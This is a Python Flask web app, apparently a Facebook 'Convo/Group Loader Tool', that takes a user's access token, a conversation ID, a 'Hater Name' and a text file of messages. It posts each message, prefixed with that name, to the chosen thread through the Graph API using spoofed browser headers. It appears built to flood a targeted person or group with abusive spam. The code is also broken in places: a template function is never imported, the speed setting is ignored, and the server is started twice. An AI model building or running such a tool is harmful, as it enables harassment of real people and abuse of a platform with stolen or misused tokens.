from flask import Flask, request
import requests
import os
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    status_message = None

    if request.method == 'POST':
        try:
            access_token = request.form.get('accessToken')
            thread_id = request.form.get('threadId')
            mn = request.form.get('kidx')
            time_interval = int(request.form.get('time'))
            txt_file = request.files['txtFile']
            messages = txt_file.read().decode().splitlines()

            for message1 in messages:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message sent: {message}")
                else:
                    raise ValueError("Invalid Information Provided")

            status_message = "Server Running Done ✅"
        except Exception as e:
            print(f"Error: {e}")
            status_message = "Your Info Error ❌"

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Amir Here❤️</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: url('https://i.imgur.com/fTFrcCf.jpeg') no-repeat center center fixed;
      background-size: cover;
      color: white;
    }
    .container {
      max-width: 350px;
      background-color: rgba(0, 0, 0, 0.7);
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
      margin: 0 auto;
      margin-top: 20px;
    }
    .header {
      text-align: center;
      padding-bottom: 10px;
    }
    .btn-submit, .btn-whatsapp, .btn-info {
      width: 100%;
      margin-top: 10px;
    }
    .btn-info {
      background-color: #17a2b8;
      border: none;
    }
    .btn-info:hover {
      background-color: #138496;
    }
    .footer {
      text-align: center;
      margin-top: 10px;
      color: white;
    }
    .status-message {
      text-align: center;
      font-weight: bold;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mb-3">𝙾𝙵𝙵𝙻𝙸𝙽𝙴 𝚂𝙴𝚁𝚅𝙴𝚁</h1>
    <h2>Made by Mian Amir🤍</h2>
  </header>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="accessToken">Enter Your Token:</label>
        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
      </div>
      <div class="mb-3">
        <label for="threadId">Enter Convo/Inbox ID:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx">Enter Hater Name:</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile">Select Your Notepad File:</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label for="time">Speed in Seconds:</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
    </form>
    <a href="https://wa.me/923114397148" target="_blank">
      <button class="btn btn-success btn-whatsapp">Contact Me on WhatsApp</button>
    </a>
    <a href="https://www.youtube.com/your-video-link" target="_blank">
      <button class="btn btn-info btn-info">How To Use video</button>
    </a>
    {% if status_message %}
      <div class="status-message">{{ status_message }}</div>
    {% endif %}
  </div>
  <footer class="footer">
    <p>&copy; Developed by Mian Amir 2024. All Rights Reserved.</p>
    <p>Convo/Group Loader Tool</p>
  </footer>
</body>
</html>
    ''', status_message=status_message)


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
    app.run(debug=True)
